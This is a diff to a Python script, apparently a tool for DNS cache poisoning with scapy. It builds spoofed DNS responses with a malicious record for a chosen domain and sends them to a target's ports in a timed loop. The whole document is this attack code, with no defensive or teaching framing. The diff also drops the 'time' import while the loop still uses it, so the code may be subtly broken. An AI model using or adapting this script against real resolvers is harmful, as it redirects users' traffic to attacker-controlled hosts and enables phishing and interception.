@@ -1,9 +1,8 @@
 import argparse
-import time
-import dns.message
-import dns.query
-import dns.rdatatype
 from scapy.all import *
+from scapy.layers.dns import DNSRR, DNS, DNSQR
+from scapy.layers.inet import IP, UDP
+
 
 def send_dns_response(target_ip, target_port, domain, spoofed_ip):
     # Craft a DNS response packet with spoofed IP and malicious record
@@ -16,12 +15,14 @@ def send_dns_response(target_ip, target_port, domain, spoofed_ip):
     # Send the DNS response packet
     send(dns_response, verbose=False)
 
+
 def cache_poisoning_attack(target_ip, target_ports, domain, spoofed_ip, duration):
     end_time = time.time() + duration
     while time.time() < end_time:
         for port in target_ports:
             send_dns_response(target_ip, port, domain, spoofed_ip)
         time.sleep(0.1)  # Adjust the sleep duration as needed
+
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
